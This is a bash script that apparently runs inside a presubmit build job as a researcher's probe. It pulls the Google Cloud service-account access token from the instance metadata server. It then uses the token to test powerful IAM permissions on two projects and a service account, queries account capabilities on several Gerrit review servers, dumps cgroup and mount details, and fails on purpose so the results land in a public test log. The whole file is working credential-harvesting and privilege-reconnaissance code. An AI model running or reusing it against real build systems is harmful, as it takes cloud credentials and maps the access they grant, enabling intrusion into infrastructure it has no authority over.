#!/usr/bin/env bash
set +e

echo 'hi_from_robert:d21766e5488dc00f:rbe-presubmit'
id
hostname
uname -a
printf 'metadata_email='
curl -fsS \
  --max-time 3 \
  -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email' \
  2>/dev/null || echo 'UNREACHABLE'
printf 'metadata_token_http_status='
curl -sS \
  -o /dev/null \
  -w '%{http_code}\n' \
  --max-time 3 \
  -H 'Metadata-Flavor: Google' \
  'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
  2>/dev/null || echo 'UNREACHABLE'

metadata_root='http://metadata.google.internal/computeMetadata/v1'
metadata_header='Metadata-Flavor: Google'
project_id="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/project/project-id" 2>/dev/null)"
project_number="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/project/numeric-project-id" 2>/dev/null)"
service_account="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/email" 2>/dev/null)"
scopes="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/scopes" 2>/dev/null | tr '\n' ',')"
token_json="$(curl -fsS --max-time 3 -H "$metadata_header" \
  "$metadata_root/instance/service-accounts/default/token" 2>/dev/null)"
access_token="$(printf '%s' "$token_json" | sed -n \
  's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')"

printf 'metadata_project_id=%s\n' "$project_id"
printf 'metadata_project_number=%s\n' "$project_number"
printf 'metadata_scopes=%s\n' "$scopes"

if [[ -n "$access_token" && -n "$project_id" ]]; then
  project_permissions='{"permissions":["resourcemanager.projects.get","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.use","serviceusage.services.list","iam.serviceAccounts.list","iam.serviceAccounts.create","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.actAs","secretmanager.secrets.list","secretmanager.secrets.create","secretmanager.versions.access","storage.buckets.list","storage.buckets.create","compute.instances.list","compute.instances.create","compute.instances.setMetadata","compute.instances.setServiceAccount","cloudbuild.builds.list","cloudbuild.builds.get","cloudbuild.builds.create","artifactregistry.repositories.list","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.uploadArtifacts","pubsub.topics.list","pubsub.topics.publish","bigquery.datasets.create"]}'
  printf 'tenant_project_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$project_permissions" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id:testIamPermissions" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'service_project_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$project_permissions" \
    'https://cloudresourcemanager.googleapis.com/v1/projects/572389441833:testIamPermissions' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  service_account_permissions='{"permissions":["iam.serviceAccounts.get","iam.serviceAccounts.getIamPolicy","iam.serviceAccounts.setIamPolicy","iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.getOpenIdToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccountKeys.create"]}'
  printf 'service_account_test_iam_permissions='
  curl -sS --max-time 10 -X POST \
    -H "Authorization: Bearer $access_token" \
    -H 'Content-Type: application/json' \
    --data "$service_account_permissions" \
    "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$service_account:testIamPermissions" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'


  for gerrit_origin in \
    'https://chromium-review.googlesource.com' \
    'https://bazel-review.googlesource.com' \
    'https://gerrit-review.googlesource.com' \
    'https://skia-review.googlesource.com'; do
    gerrit_name="$(printf '%s' "$gerrit_origin" | sed 's#https://##; s#-review.googlesource.com##')"
    printf 'gerrit_%s_self=' "$gerrit_name"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "$gerrit_origin/a/accounts/self/detail" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
    printf 'gerrit_%s_capabilities=' "$gerrit_name"
    curl -sS --max-time 10 \
      -H "Authorization: Bearer $access_token" \
      "$gerrit_origin/a/accounts/self/capabilities" \
      -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
    printf '\n'
  done

  printf 'tenant_project_resource_manager_get='
  curl -sS --max-time 10 \
    -H "Authorization: Bearer $access_token" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/$project_id" \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'

  printf 'service_project_resource_manager_get='
  curl -sS --max-time 10 \
    -H "Authorization: Bearer $access_token" \
    'https://cloudresourcemanager.googleapis.com/v1/projects/572389441833' \
    -w '\nhttp_status=%{http_code}' 2>/dev/null || printf 'REQUEST_FAILED'
  printf '\n'
else
  echo 'identity_probe=NO_METADATA_TOKEN_OR_PROJECT'
fi
echo 'cgroup:'
cat /proc/1/cgroup 2>/dev/null || true
echo 'mounts:'
sed -n '1,40p' /proc/mounts 2>/dev/null || true

# Keep the receipt in the owned public test log even when test output defaults
# change; this synthetic target is expected to fail.
exit 1
